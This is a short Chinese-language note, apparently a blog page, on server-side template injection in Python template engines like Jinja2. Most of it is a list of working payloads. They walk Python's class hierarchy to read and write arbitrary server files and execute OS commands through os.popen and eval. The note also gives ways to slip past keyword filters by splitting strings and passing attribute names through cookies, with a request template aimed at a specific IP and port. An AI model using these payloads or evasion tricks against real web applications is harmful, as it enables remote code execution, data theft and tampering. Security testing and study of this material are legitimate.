# 服务器端模板注入(SSTI)

标签（空格分隔）： 未分类

---

##什么是服务器端模板
服务器端模板提供了一种简单的方法来管理动态生成的HTML代码，优点就是可以在服务器端动态生成HTML页面，使代码更加简单易于管理与修改，避免了如HTML代码和PHP代码复杂的混合在一起，变量难以辨认等状况。
##模板注入原理
模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，由于模板引擎支持使用静态模板文件，并在运行时用HTML页面中的实际值替换变量/占位符从而使html设计变得简略，目前常用模板有Smarty、Twig、Jinja2、FreeMarker和Velocity。
##常用payload
一般来说，ssti可以用于xss，当测试有触发xss时可以进一步考虑模板注入。
以下给出一些常用payload。

    //读文件
    ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
     
    //写文件
    ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
     
    //执行任意命令
    ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
  

    #命令执行：
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
    #文件操作
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}  
##绕过方式
在实际使用时我们往往要面对各种各样的限制，这时候就需要使用如拼接绕过，参数绕过等方法。
1.拼接绕过
由于在模板的url路径中是支持字符串连接的，所以可以如下利用

    request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]
函数名也可以

    ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').re'+'ad()
在躲避关键字检查时可以利用getattribute函数进行拼接

    ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]
     
    # 进行关键字绕过
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache']

2.参数绕过
可以利用request.form, request.args,request.values这三个函数，实现在cookie拼接绕过。

    url = '''http://47.96.118.255:2333/{{''[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40]('a.php')[request.cookies.d]()}}'''
     
    cookies = {}
    cookies['a'] = '__class__'
    cookies['b'] = '__mro__'
    cookies['c'] = '__subclasses__'
    cookies['d'] = 'read'

##总结
1.注意环境是python2还是python3，一般python2有的python3都有。
2.若类中有file，考虑读写操作
3.若类中有<class 'warnings.WarningMessage'>，考虑从.__init__.func_globals.values()[13]获取eval，map等等；又或者从.__init__.func_globals[linecache] 得到os
4.若类中有<type 'file'>，<class 'ctypes.CDLL'>，<class 'ctypes.LibraryLoader'>，考虑构造so文件
5.注意导入模块的方式

